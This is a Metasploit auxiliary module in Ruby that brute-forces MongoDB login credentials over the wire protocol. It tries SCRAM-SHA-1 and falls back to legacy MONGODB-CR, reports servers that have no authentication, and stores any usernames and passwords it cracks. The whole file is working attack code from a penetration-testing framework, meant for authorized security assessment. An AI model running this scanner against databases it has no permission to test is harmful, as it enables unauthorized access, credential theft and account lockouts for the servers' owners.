##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'bson'
require 'openssl'
require 'digest'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Mongodb
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'MongoDB Login Utility',
        'Description' => %q{
          This module attempts to brute force authentication credentials for MongoDB.
          It supports both SCRAM-SHA-1 (MongoDB 3.0+) and falls back to legacy
          MONGODB-CR authentication if SCRAM is unsupported by the target server.
        },
        'References' => [
          [ 'URL', 'https://docs.mongodb.com/manual/reference/mongodb-wire-protocol/' ],
          [ 'URL', 'https://github.com/mongodb/specifications/blob/master/source/auth/auth.rst/' ]
        ],
        'Author' => [
          'Gregory Man <man.gregory[at]gmail.com>',
          'h00die', # SCRAM and updating compatibility for MongoDB 3.0+ and later
          'prithvee07'
        ],
        'License' => MSF_LICENSE,
        'Notes' => {
          'Reliability' => [],
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS, ACCOUNT_LOCKOUTS]
        }
      )
    )

    register_options(
      [
        Opt::RPORT(27017),
        OptString.new('DB', [ true, 'Database to use', 'admin'])
      ]
    )
  end

  def run_host(ip)
    print_status("Scanning IP: #{ip}")
    begin
      connect

      version = get_version
      ver_info = version ? " (version #{version})" : ''

      if require_auth?
        print_status("Mongo server#{ver_info} requires authentication")
        each_user_pass do |user, pass|
          do_login(user, pass)
        end
      else
        report_vuln(
          host: rhost,
          port: rport,
          name: 'MongoDB No Authentication',
          refs: references,
          exploited_at: Time.now.utc,
          info: "Mongo server has no authentication.#{ver_info}"
        )
        print_good("Mongo server #{ip}#{ver_info} doesn't use authentication")
      end
      disconnect
    rescue StandardError => e
      print_error "Unable to connect: #{e}"
      return
    end
  end

  def get_version
    cmd = BSON::Document.new({ 'buildInfo' => BSON::Int32.new(1) })
    pkt = mongodb_build_packet('admin.$cmd', cmd.to_bson.to_s)

    sock.put(pkt)
    resp = sock.get_once(-1, 5)

    doc = mongodb_parse_doc(resp)
    return nil unless doc && doc['version']

    version_str = doc['version']
    report_service(
      host: rhost,
      port: rport,
      name: 'mongodb',
      proto: 'tcp',
      info: "MongoDB #{version_str}"
    )
    version_str
  rescue StandardError => e
    vprint_error("Failed to parse version from buildInfo: #{e.message}")
    nil
  end

  def require_auth?
    cmd = BSON::Document.new({ 'listDatabases' => BSON::Int32.new(1) })
    list_db_pkt = mongodb_build_packet('admin.$cmd', cmd.to_bson.to_s)

    sock.put(list_db_pkt)
    auth_resp = sock.get_once(-1, 5)

    mongodb_have_auth_error?(auth_resp)
  end

  def do_login(user, password)
    vprint_status("Trying user: #{user}, password: #{password}")

    # 1. Try SCRAM-SHA-1 first (MongoDB 3.0+)
    scram_status = auth_scram_sha1(user, password)
    return scram_status if scram_status == :next_user

    # 2. Fallback to MONGODB-CR if SCRAM failed or is unsupported
    vprint_status('SCRAM-SHA-1 not accepted or failed; trying MONGODB-CR fallback...')
    nonce = get_nonce
    if nonce.present?
      cr_status = auth_cr(user, password, nonce)
      return cr_status if cr_status == :next_user
    end

    nil
  end

  # SCRAM-SHA-1 Handshake (MongoDB 3.0+)
  def auth_scram_sha1(user, password)
    db = datastore['DB']
    digest_pass = Digest::MD5.hexdigest("#{user}:mongo:#{password}")

    client_nonce = Rex::Text.rand_text_alphanumeric(24)
    auth_payload = "n=#{user},r=#{client_nonce}"
    client_first_bare = auth_payload
    client_first_message = "n,,#{auth_payload}"

    sasl_start_cmd = BSON::Document.new({
      'saslStart' => BSON::Int32.new(1),
      'mechanism' => 'SCRAM-SHA-1',
      'payload' => BSON::Binary.new(client_first_message)
    })

    pkt = mongodb_build_packet("#{db}.$cmd", sasl_start_cmd.to_bson.to_s)
    sock.put(pkt)
    resp = sock.get_once(-1, 5)

    reply = mongodb_parse_doc(resp)
    return nil unless reply && reply['ok'].to_i == 1

    conversation_id = reply['conversationId']
    server_payload = reply['payload'].data
    server_vars = mongodb_parse_scram_payload(server_payload)

    server_nonce = server_vars['r']
    salt = Rex::Text.decode_base64(server_vars['s'])
    iterations = server_vars['i'].to_i

    salted_password = OpenSSL::PKCS5.pbkdf2_hmac(
      digest_pass,
      salt,
      iterations,
      20,
      OpenSSL::Digest.new('SHA1')
    )

    client_key = OpenSSL::HMAC.digest('sha1', salted_password, 'Client Key')
    stored_key = OpenSSL::Digest::SHA1.digest(client_key)
    client_final_without_proof = "c=biws,r=#{server_nonce}"
    auth_message = "#{client_first_bare},#{server_payload},#{client_final_without_proof}"

    client_signature = OpenSSL::HMAC.digest('sha1', stored_key, auth_message)
    client_proof = Rex::Text.xor(client_key, client_signature)
    client_final_message = "#{client_final_without_proof},p=#{Rex::Text.encode_base64(client_proof)}"

    conv_id_bson = conversation_id.is_a?(Integer) ? BSON::Int32.new(conversation_id) : conversation_id

    sasl_continue_cmd = BSON::Document.new({
      'saslContinue' => BSON::Int32.new(1),
      'conversationId' => conv_id_bson,
      'payload' => BSON::Binary.new(client_final_message)
    })

    pkt = mongodb_build_packet("#{db}.$cmd", sasl_continue_cmd.to_bson.to_s)
    sock.put(pkt)
    resp = sock.get_once(-1, 5)

    reply = mongodb_parse_doc(resp)
    if reply && reply['ok'].to_i == 1
      print_good("#{rhost} - SUCCESSFUL LOGIN '#{user}' : '#{password}' (SCRAM-SHA-1)")
      report_cred(
        ip: rhost,
        port: rport,
        service_name: 'mongodb',
        user: user,
        password: password,
        proof: reply.inspect
      )
      return :next_user
    end

    nil
  rescue StandardError => e
    vprint_error("SCRAM-SHA-1 exception: #{e.message}")
    nil
  end

  # Legacy MONGODB-CR Handshake (MongoDB < 3.0)
  def auth_cr(user, password, nonce)
    db = datastore['DB']
    key = Rex::Text.md5(nonce + user + Rex::Text.md5("#{user}:mongo:#{password}"))

    cmd = BSON::Document.new({
      'authenticate' => BSON::Int32.new(1),
      'user' => user,
      'nonce' => nonce,
      'key' => key
    })

    packet = mongodb_build_packet("#{db}.$cmd", cmd.to_bson.to_s)
    sock.put(packet)
    response = sock.get_once(-1, 5)

    reply = mongodb_parse_doc(response)
    if reply && reply['ok'].to_i == 1
      print_good("#{rhost} - SUCCESSFUL LOGIN '#{user}' : '#{password}' (MONGODB-CR)")
      report_cred(
        ip: rhost,
        port: rport,
        service_name: 'mongodb',
        user: user,
        password: password,
        proof: reply.inspect
      )
      return :next_user
    end

    nil
  rescue StandardError => e
    vprint_error("MONGODB-CR exception: #{e.message}")
    nil
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      last_attempted_at: Time.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def get_nonce
    cmd = BSON::Document.new({ 'getnonce' => BSON::Int32.new(1) })
    pkt = mongodb_build_packet("#{datastore['DB']}.$cmd", cmd.to_bson.to_s)

    sock.put(pkt)
    response = sock.get_once(-1, 5)

    doc = mongodb_parse_doc(response)
    doc && doc['ok'].to_i == 1 ? doc['nonce'].to_s : ''
  end
end
